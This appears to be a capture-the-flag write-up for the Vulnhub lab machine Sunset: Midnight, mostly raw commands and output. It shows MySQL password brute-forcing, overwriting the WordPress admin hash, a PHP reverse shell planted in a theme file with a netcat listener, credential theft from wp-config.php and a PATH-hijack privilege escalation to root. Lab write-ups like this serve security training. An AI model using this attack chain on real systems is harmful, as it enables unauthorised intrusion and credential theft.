# Sunset: Midnight, Vulnhub Writeup
## MySQL | Brute force
```console
ncrack -p 3306 --user root -P /usr/share/wordlists/rockyou.txt sunset-midnight
Discovered credentials for mysql on 10.0.2.52 3306/tcp:
10.0.2.52 3306/tcp mysql: 'root' 'robert'
```
## MySQL | UPDATE wp_users
```console
root@h1pno:~# mysql -u root -p -h 10.0.2.52
Enter password:robert

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+


MariaDB [(none)]> use wordpress_db;
MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+

MariaDB [wordpress_db]> update wp_users set user_pass='$2y$12$Lnpe6P3puw1qNXeQLetw5uYg7PhsD7tfpU4JKsvTOTgYztRuk3mZK' where user_login='admin';
Query OK, 1 row affected (0.436 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+--------------------------------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                                                    | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+--------------------------------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $2y$12$Lnpe6P3puw1qNXeQLetw5uYg7PhsD7tfpU4JKsvTOTgYztRuk3mZK | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+--------------------------------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)

MariaDB [wordpress_db]>
```
## Wordpress | TwentyTwenty Reverse shell
### Edit the theme with your php reverse shell
```console
curl http://sunset-midnight/wp-content/themes/twentytwenty/404.php
```
## My Machine
```console
nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from sunset-midnight [10.0.2.52] 42724
Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 17:08:41 up  4:27,  0 users,  load average: 0.00, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@midnight:/$ export TERM=xterm
```
## Search for Credentials
```console
www-data@midnight:/var/www/html/wordpress$ pwd
pwd
/var/www/html/wordpress

www-data@midnight:/var/www/html/wordpress$ cat wp-config.php | grep USER
cat wp-config.php | grep USER
define( 'DB_USER', 'jose' );

www-data@midnight:/var/www/html/wordpress$ cat wp-config.php | grep PASSW
cat wp-config.php | grep PASSW
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

## Become jose
```console
su jose
Password: 645dc5a8871d2a4269d4cbe23f6ae103
```
## Become Root
```console
jose@midnight:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/status

jose@midnight:~$ strings /usr/bin/status
Status of the SSH server:
service ssh status

jose@midnight:~$ cd /tmp
cd /tmp
jose@midnight:/tmp$ echo "/bin/sh" > service
jose@midnight:/tmp$ chmod +x service
jose@midnight:/tmp$ export
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

jose@midnight:/tmp$ export PATH=/tmp:$PATH                         
jose@midnight:/tmp$ /usr/bin/status
/usr/bin/status
# cd /root
cd /root
# cat root.txt
cat root.txt
          ___   ____
        /' --;^/ ,-_\     \ | /
       / / --o\ o-\ \\   --(_)--
      /-/-/|o|-|\-\\|\\   / | \
       '`  ` |-|   `` '
             |-|
             |-|O
             |-(\,__
          ...|-|\--,\_....
      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------

db2def9d4ddcb83902b884de39d426e6

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```
